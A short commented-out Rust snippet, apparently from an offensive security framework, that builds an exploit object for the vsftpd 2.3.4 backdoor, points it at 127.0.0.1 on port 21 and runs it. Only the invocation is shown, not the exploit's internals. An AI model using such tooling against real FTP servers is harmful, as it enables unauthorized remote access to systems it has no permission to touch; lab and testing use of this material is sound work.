/*
println!("lets exploit vsftpd v2.3.4");
println!(
    "Vsftpd exploit description: {}",
    Vsftpd234Backdoor::info().description
);
let vsftpd_234_backdoor = Vsftpd234Backdoor::new(
    RemoteTcp {
        rhost: "127.0.0.1".to_string(),
        rport: "21".to_string(),
        read_timeout: Some(Duration::from_secs(60)),
        write_timeout: Some(Duration::from_secs(60)),
    },
    None,
);
match vsftpd_234_backdoor.exploit() {
    Ok(_) => (),
    Err(e) => {
        error!("{}", e);
    }
}
*/
